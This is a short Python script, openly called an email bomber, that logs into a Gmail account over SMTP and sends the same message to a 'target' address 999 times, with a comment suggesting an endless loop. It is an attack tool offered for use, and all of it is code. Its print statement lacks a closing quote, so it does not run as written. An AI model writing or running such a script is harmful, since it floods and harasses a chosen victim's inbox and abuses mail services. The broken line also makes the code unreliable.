#!/usr/bin/env python
#You should set your information
import smtplib

sender = 'your email@gmail.com'
reciver = 'target email@example.com'
password = 'yor email account password'
subject = 'test email_bomber script'
header = 'From :{}\n'.format(sender)
header += 'To :{}\n'.format(reciver)
header += 'Subject :{}\n'.format(subject)
message = header + 'This is a email_bomber script with python,enjoy!'

try:
    for n in range(1,1000): # or you can use from "while true" loop
        server = smtplib.SMTP(host='smtp.gmail.com',port=587)
        server.starttls()
        server.login(sender,password)
        server.sendmail(from_addr=sender,to_addrs=reciver,msg=message)
        server.quit()
        print('{} email sent.format(n))
except:
    print('Failed to send email!!!')
